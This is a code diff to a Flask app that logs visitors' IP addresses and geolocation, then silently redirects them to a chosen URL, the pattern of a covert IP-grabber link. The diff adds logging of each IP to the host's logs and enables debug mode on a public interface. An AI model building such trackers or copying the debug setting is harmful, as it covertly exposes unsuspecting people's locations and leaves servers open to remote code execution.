@@ -3,7 +3,7 @@ import datetime, requests
 
 app = Flask(__name__)
 
-REDIRECT_URL = "https://example.com"  # change this to wherever you want visitors sent
+REDIRECT_URL = "https://example.com"  # change this to your redirect target
 
 def get_geo_info(ip):
     try:
@@ -21,10 +21,14 @@ def log_ip():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     geo_info = get_geo_info(ip) if not ip.startswith(("192.168", "10.", "172.")) else "Local network IP"
 
+    # Debug print to Render logs
+    print(f"[{datetime.datetime.now()}] IP: {ip} - {geo_info}")
+
+    # Optionally also save to file
     with open("ip_log.txt", "a") as f:
         f.write(f"{datetime.datetime.now()} - {ip} - {geo_info}\n")
 
     return redirect(REDIRECT_URL)
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    app.run(host="0.0.0.0", port=5000, debug=True)
